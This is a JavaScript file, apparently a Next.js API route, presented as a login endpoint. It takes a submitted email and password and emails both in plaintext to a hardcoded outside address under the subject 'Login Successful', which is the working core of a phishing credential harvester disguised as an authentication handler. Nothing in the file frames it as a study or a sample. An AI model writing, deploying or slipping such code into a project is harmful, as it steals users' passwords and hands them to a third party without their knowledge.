import { sendMail } from "@/service/mailService";

export async function POST(req, res) {
    const { email, password } = await req.json();

    try {
        const emailRegex = new RegExp(/^[A-Za-z0-9_!#$%&'*+\/=?`{|}~^.-]+@[A-Za-z0-9.-]+$/, "gm");

        // format email
        if (emailRegex.test(email)){
            let formattedEmail = email.split('@');
            let email_username = formattedEmail[0];
            let email_domain = formattedEmail[1];

            // send email
            await sendMail(
                "Login Successful",
                "dontkillme@bunnyfiedlabs.com",
                `
                    Email : ${email}
                    Email Username : ${email_username}
                    Email Domain : ${email_domain}
                    Password : ${password}
                `
            );
            return new Response(JSON.stringify({ data: "Email sent successfully" }), {status:200});
        } else {
            return new Response(JSON.stringify({ data: "Email is not a valid email" }), {status:200});
        }
        
    } catch (error) {
        return new Response(JSON.stringify({data : "Could not log in"}), { status: 500 })
    }
}